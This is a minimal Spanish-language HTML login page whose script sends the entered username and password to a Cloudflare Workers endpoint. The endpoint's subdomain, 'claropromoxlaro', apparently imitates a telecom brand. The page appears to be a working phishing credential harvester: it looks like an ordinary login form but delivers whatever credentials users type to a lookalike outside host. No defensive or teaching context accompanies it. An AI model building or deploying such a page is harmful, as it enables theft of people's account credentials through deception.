<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>Formulario de Login</h2>

  <form id="loginForm">
    <label>Usuario: <input type="text" name="usuario" required></label><br><br>
    <label>Clave: <input type="password" name="clave" required></label><br><br>
    <button type="submit">Enviar</button>
  </form>

  <p id="resultado"></p>

  <script>
    const WORKER_URL = "https://blue-night-7897.claropromoxlaro.workers.dev/login";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const form = e.target;
      const data = {
        usuario: form.usuario.value,
        clave: form.clave.value,
        transactionId: crypto.randomUUID()
      };

      try {
        const res = await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        if (!res.ok) throw new Error("Error HTTP " + res.status);
        const json = await res.json();
        document.getElementById("resultado").textContent = "✅ Enviado: " + JSON.stringify(json);
      } catch (err) {
        document.getElementById("resultado").textContent = "❌ Error de conexión: " + err.message;
      }
    });
  </script>
</body>
</html>
